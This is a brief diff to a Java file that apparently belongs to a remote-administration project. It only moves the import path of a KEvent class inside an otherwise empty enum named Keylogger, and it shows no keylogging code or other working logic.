@@ -23,7 +23,7 @@ import java.util.concurrent.BlockingQueue;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
-import com.subterranean_security.crimson.core.proto.net.Keylogger.KEvent;
+import com.subterranean_security.crimson.core.proto.Keylogger.KEvent;
 
 public enum Keylogger {
 	;
